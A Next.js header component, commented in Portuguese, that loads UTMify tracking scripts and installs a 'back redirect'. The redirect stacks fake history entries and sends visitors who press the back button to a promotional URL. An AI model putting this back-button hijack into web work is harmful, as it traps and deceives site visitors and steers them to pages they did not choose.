import Script from "next/script";

/** Altere para a página que deve abrir quando o usuário tentar sair (botão voltar) */
const BACK_REDIRECT_LINK = "https://www.reward-apps.com/promo";

/** Pixel UTMify */
const PIXEL_ID = "69b957c1a8bc4b322ccfb78c";

export default function HeaderScript() {
  return (
    <>
      {/* Pixel: define ID e carrega o script */}
      <Script
        id="utmify-pixel"
        strategy="afterInteractive"
        dangerouslySetInnerHTML={{
          __html: `
            window.pixelId = "${PIXEL_ID}";
            var a = document.createElement("script");
            a.setAttribute("async", "");
            a.setAttribute("defer", "");
            a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
            document.head.appendChild(a);
          `,
        }}
      />

      {/* Script de UTMs */}
      <Script
        id="utmify-utms"
        src="https://cdn.utmify.com.br/scripts/utms/latest.js"
        data-utmify-prevent-xcod-sck
        data-utmify-prevent-subids
        strategy="afterInteractive"
      />

      {/* Back Redirect: redireciona o botão voltar para BACK_REDIRECT_LINK */}
      <Script
        id="utmify-back-redirect"
        strategy="afterInteractive"
        dangerouslySetInnerHTML={{
          __html: `
            var link = ${JSON.stringify(BACK_REDIRECT_LINK)};
            function setBackRedirect(url) {
              var urlBackRedirect = url;
              urlBackRedirect = urlBackRedirect.trim() +
                (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
                document.location.search.replace('?', '').toString();
              history.pushState({}, '', location.href);
              history.pushState({}, '', location.href);
              history.pushState({}, '', location.href);
              window.addEventListener('popstate', function() {
                setTimeout(function() { location.href = urlBackRedirect; }, 1);
              });
            }
            setBackRedirect(link);
          `,
        }}
      />
    </>
  );
}
